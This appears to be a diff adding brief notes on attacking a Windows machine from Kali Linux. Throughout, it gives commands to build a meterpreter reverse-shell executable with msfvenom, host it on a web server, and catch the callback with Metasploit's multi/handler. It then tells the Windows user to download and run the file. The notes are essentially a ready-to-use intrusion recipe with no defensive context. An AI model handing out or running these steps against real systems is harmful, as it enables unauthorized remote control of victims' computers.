@@ -1,0 +1,20 @@
+Remote Access using Kali, attacking a Windows machine
+
+On Kali:
+1) service apache2 start 
+2) msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali's IP> LPORT=1234 --format=exe > /var/www/html/<name>.exe
+3) service postgresql start
+4) msfconsole
+5) use exploit/multi/handler
+6) set payload windows/meterpreter/reverse_tcp
+7) set LHOST <same IP as above>
+8) set LPORT 1234 <or same port as above>
+9) exploit -j -z //waiting for executable to be ran
+~ After ran or popup in terminal that a session has opened... ~
+10) sessions -i //list all available sessions
+11) sessions -i 1 <or any session number to open meterpreter shell>
+12) ? //if confused
+
+On Windows
+1) open up browser and go to http://<IP of kali machine or web server>/<name of executable>.exe
+2) save and/or run executable
